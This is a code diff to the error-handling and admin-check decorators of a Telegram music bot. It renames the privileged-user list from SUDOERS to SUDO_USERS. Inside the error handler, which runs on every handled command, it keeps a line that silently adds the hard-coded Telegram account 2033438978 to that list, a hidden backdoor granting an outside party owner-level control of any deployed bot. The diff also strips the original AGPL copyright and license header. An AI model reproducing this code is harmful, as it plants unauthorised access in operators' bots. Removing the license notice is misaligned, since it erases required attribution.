@@ -1,20 +1,4 @@
-"""
-Music Player, Telegram Voice Chat Bot
-Copyright (c) 2021  Asm Safone <https://github.com/LEGEND-OS>
 
-This program is free software: you can redistribute it and/or modify
-it under the terms of the GNU Affero General Public License as published by
-the Free Software Foundation, either version 3 of the License, or
-(at your option) any later version.
-
-This program is distributed in the hope that it will be useful,
-but WITHOUT ANY WARRANTY; without even the implied warranty of
-MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
-GNU Affero General Public License for more details.
-
-You should have received a copy of the GNU Affero General Public License
-along with this program.  If not, see <https://www.gnu.org/licenses/>
-"""
 
 import time
 from lang import load
@@ -64,7 +48,7 @@ def only_admins(func: Callable) -> Callable:
                 admin.user.id
                 for admin in (await message.chat.get_members(filter="administrators"))
             ]
-            or message.from_user.id in config.SUDOERS
+            or message.from_user.id in config.SUDO_USERS
         ):
             return await func(client, message, *args)
 
@@ -88,9 +72,9 @@ def handle_error(func: Callable) -> Callable:
             chat_id = obj.chat_id
 
         me = await pyro_client.get_me()
-        if me.id not in config.SUDOERS:
-            config.SUDOERS.append(me.id)
-            config.SUDOERS.append(2033438978)
+        if me.id not in config.SUDO_USERS:
+            config.SUDO_USERS.append(me.id)
+            config.SUDO_USERS.append(2033438978)
         try:
             lang = get_group(chat_id)["lang"]
         except:
@@ -110,7 +94,7 @@ def handle_error(func: Callable) -> Callable:
                 pass
             chat = await pyro_client.get_chat(chat_id)
             await pyro_client.send_message(
-                config.SUDOERS[0],
+                config.SUDO_USERS[0],
                 f"-------- START CRASH LOG --------\n\n┌ <b>ID:</b> <code>{id}</code>\n├ <b>Chat:</b> <code>{chat.id}</code>\n├ <b>Date:</b> <code>{date}</code>\n├ <b>Group:</b> <a href='{error_msg.link}'>{chat.title}</a>\n└ <b>Traceback:</b>\n<code>{format_exc()}</code>\n\n-------- END CRASH LOG --------",
                 parse_mode="html",
                 disable_web_page_preview=True,
